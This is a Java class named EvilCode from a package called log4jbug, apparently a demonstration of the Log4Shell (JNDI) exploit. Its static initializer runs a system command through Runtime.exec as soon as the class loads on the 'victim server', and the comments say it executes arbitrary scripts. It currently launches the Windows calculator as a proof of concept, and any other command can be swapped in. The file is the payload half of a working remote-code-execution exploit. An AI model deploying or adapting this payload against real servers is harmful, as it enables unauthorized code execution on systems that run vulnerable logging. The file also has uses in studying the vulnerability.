package com.fly.log4jbug;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;


/**
 * @Title: 执行任意的脚本，目前的脚本会使windows打开计算器
 * @ClassName: geektime.log.EvilCode.java
 * @Description:
 *
 * @Copyright 2020-2021  - Powered By 研发中心
 * @author: 王延飞
 * @date:  2022/1/6 16:23
 * @version V1.0
 */
public class EvilCode  {
    static {
        System.out.println("受害服务器将执行下面命令行");
        Process p;

        String[] cmd = {"calc"};
        try {
            p = Runtime.getRuntime().exec("calc");
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            while((line=br.readLine())!=null) {
                System.out.println(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


}
